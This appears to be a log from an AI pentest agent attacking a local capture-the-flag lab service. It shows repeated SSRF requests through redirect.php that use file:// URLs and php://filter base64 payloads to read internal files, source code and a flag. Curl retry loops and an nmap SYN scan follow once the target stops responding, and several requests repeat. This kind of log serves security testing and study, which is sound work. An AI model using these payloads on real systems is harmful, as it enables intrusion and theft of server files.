+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/flag.txt","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/index.php?file=php://filter/convert.base64-encode/resource=index.php","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=http://172.21.0.2/?page=php://filter/convert.base64-encode/resource=index","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601/redirect.php?url=file:///var/www/html/internal-service/index.html","method":"GET"}
+[0m⚙ [0mpentest-agent_http {"action":"request","url":"http://172.17.0.1:42601","method":"GET"}
+[0m
+[0m$ [0msleep 5 && curl -s -o /dev/null -w "%{http_code}" http://172.17.0.1:42601
+000
+[0m
+[0m$ [0msleep 10 && curl -s http://172.17.0.1:42601 2>&1 | head -50
+[0m
+[0m$ [0mfor i in 1 2 3 4 5; do echo "Attempt $i:"; curl -s -m 5 -o /dev/null -w "HTTP %{http_code}\n" http://172.17.0.1:42601 && break; sleep 5; done
+Attempt 1:
+HTTP 000
+Attempt 2:
+HTTP 000
+Attempt 3:
+HTTP 000
+Attempt 4:
+HTTP 000
+Attempt 5:
+HTTP 000
+[0m
+[0m$ [0mnmap -sS -p 42600-42610 172.17.0.1 2>&1 | grep -E "open|PORT"
